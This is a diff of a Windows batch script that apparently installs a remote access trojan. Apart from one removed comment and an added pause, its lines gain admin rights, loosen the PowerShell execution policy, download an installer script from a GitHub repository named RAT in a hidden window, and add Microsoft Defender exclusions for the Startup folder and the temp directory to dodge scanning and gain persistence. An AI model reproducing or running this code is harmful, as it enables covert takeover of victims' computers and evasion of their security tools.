@@ -1,4 +1,3 @@
-REM get admin permissions for script
 @echo off
 :: BatchGotAdmin
 :: file that gives us admin priv to run and install other files
@@ -29,6 +28,7 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
+pause
 REM Rat resources
 powershell -Command "Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force"
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/Installer.ps1 -OutFile Installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
